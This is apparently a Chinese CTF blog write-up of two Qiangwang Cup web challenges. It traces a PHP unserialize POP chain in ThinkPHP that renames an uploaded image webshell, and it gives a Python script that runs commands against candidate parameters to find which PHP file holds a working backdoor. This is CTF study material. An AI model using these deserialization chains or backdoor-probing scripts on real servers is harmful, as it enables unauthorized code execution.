---
title: 'qwb复现'
date: 2019-08-03
updated: 2019-08-04
category: 'ctf'
tags:
  - 'php'
  - 'web'
  - 'thinkphp'
lang: 'zh'
draft: false
---
复现一些qwb的题目

## upload

可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件  
如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索`unserialize`找到一处可以利用的代码：

```php
public function login_check(){
       $profile=cookie('user');  //获取到cookie中的user值
       if(!empty($profile)){
           $this->profile=unserialize(base64_decode($profile)); //直接反序列化
           $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
           if(array_diff($this->profile_db,$this->profile)==null){
               return 1;
           }else{
               return 0;
           }
       }
   }
```

接下来去寻找哪里调用了这个方法，在Profile这个类中  

```php
public function upload_img(){
     if($this->checker){
         if(!$this->checker->login_check()){
             $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
             $this->redirect($curr_url,302);
             exit();
         }
     }
     ...
```

`upload_img方法`会调用`login_check`反序列化

> 而这个操作中的 \\$this->ext、\\$this->filename\_tmp、$this->filename 均可通过反序列化控制。

同时在`Profile.php`文件的末尾还有一处

```php
public function __get($name)
{
    return $this->except[$name];
}

public function __call($name, $arguments)
{
    if($this->{$name}){
        $this->{$this->{$name}}($arguments);
    }
}
```

这两个函数的意思是如果访问了类中的`private`属性，就会调用`__get`方法，如果调用了类中不存在的方法，就会通过`__call`对`$this->name`所指向的方法进行调用

意味着我们可以调用任意的类方法

同时在`Register.php`中有一处：  

```php
public function __destruct()
{
    if(!$this->registed){
        $this->checker->index();
    }
}
```

首先上传一个图片马，之后通过`Register`类的`__destruct`方法，调用`__get`方法得到函数名`upload_img`，再调用`__call`方法，通过调用`upload_img`可以对图片马进行改名

如果我们将`$this->checker`赋值为`Profile`类，由于`Profile`类中不存在`index`方法，就会触发`__call`，这样就能构造一条完成的攻击链

## 高明的黑客

```python
import os,re
import requests
filenames = os.listdir('/var/www/html/src')
pattern = re.compile(r"\$_[GEPOST]{3,4}\[.*\]")
for name in filenames:
    print(name)
    with open('/var/www/html/src/'+name,'r') as f:
        data = f.read()
    result = list(set(pattern.findall(data)))

    for ret in result:
        try:
            command = 'uname'
            flag = 'Linux'
            # command = 'phpinfo();'
            # flag = 'phpinfo'
            if 'GET' in ret:
                passwd = re.findall(r"'(.*)'",ret)[0]
                r = requests.get(url='http://127.0.0.1:8888/' + name + '?' + passwd + '='+ command)
                if flag in r.text:
                    print('backdoor file is: ' + name)
                    print('GET:  ' + passwd)
            elif 'POST' in ret:
                passwd = re.findall(r"'(.*)'",ret)[0]
                r = requests.post(url='http://127.0.0.1:8888/' + name,data={passwd:command})
                if flag in r.text:
                    print('backdoor file is: ' + name)
                    print('POST:  ' + passwd)
        except : pass
```
